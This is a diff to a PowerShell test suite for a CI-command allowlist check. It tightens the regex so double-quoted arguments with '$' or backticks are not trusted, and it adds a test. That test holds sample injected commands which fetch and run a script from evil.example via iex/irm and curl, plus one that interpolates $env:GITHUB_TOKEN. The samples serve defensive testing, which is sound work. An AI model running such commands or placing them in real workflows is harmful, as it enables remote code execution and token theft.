@@ -74,7 +74,7 @@ $script:Passes = 0
 # DECLARED, never counted from the cases that happened to run: a count taken
 # from what ran cannot notice that nothing did. Keep it in step with the cases
 # below -- a mismatch either way fails the run.
-$ExpectedCaseCount = 83
+$ExpectedCaseCount = 84
 
 # What the two cases that plant a package built to HANG give the sweep before
 # they expect it to give up, and how long this suite then waits for any case.
@@ -744,7 +744,7 @@ function Get-UnownedCiCommand {
 		throw "no .ps1 files under $(Join-Path $RepoRoot 'scripts'), so every ci.yml command would read as unowned."
 	}
 
-	$allowPattern = '^\.\\scripts\\(?<name>[A-Za-z0-9_.-]+\.ps1)\b(?:[ \t]+(?:-[A-Za-z][A-Za-z0-9]*|''[^''\r\n]*''|"[^"\r\n]*"|[A-Za-z0-9_.:\\/-]+))*[ \t]*$'
+	$allowPattern = '^\.\\scripts\\(?<name>[A-Za-z0-9_.-]+\.ps1)\b(?:[ \t]+(?:-[A-Za-z][A-Za-z0-9]*|''[^''\r\n]*''|"[^"$`\r\n]*"|[A-Za-z0-9_.:\\/-]+))*[ \t]*$'
 
 	$unowned = @()
 	foreach ($match in [regex]::Matches($Text, '(?m)^[ \t]*run:[ \t]*(.+?)[ \t]*\r?$')) {
@@ -1277,6 +1277,27 @@ Test-Case 'a subexpression argument to an owned scripts\ call is not read as own
 		$unowned = @(Get-UnownedCiCommand -Text $text)
 		if ($unowned -notcontains $command) {
 			throw "'$command' was not read as unowned, so a subexpression riding in an owned script's argument would pass the pin."
+		}
+	}
+}
+
+Test-Case 'a double-quoted subexpression argument to an owned scripts\ call is not read as owned' {
+	# Fix round 3, finding 1: a double-quoted PowerShell string is not a
+	# literal -- it interpolates $(...), $var and backtick escapes, and that
+	# evaluation happens BEFORE the owned script is ever launched. The
+	# allowlist's quoted-literal branch must therefore exclude '$' and '`'
+	# from the double-quoted alternative (the single-quoted alternative stays
+	# untouched, since PowerShell never expands single-quoted strings).
+	$commands = @(
+		'.\scripts\test.ps1 -X "$(iex(irm https://evil.example/x.ps1))"'
+		'.\scripts\test.ps1 "$(curl -s https://evil.example/x.ps1 | iex)"'
+		'.\scripts\test.ps1 -Threads1 "$env:GITHUB_TOKEN"'
+	)
+	foreach ($command in $commands) {
+		$text = "      - name: Scratch`r`n        shell: pwsh`r`n        run: $command`r`n"
+		$unowned = @(Get-UnownedCiCommand -Text $text)
+		if ($unowned -notcontains $command) {
+			throw "'$command' was not read as unowned, so a double-quoted subexpression riding in an owned script's argument would pass the pin."
 		}
 	}
 }
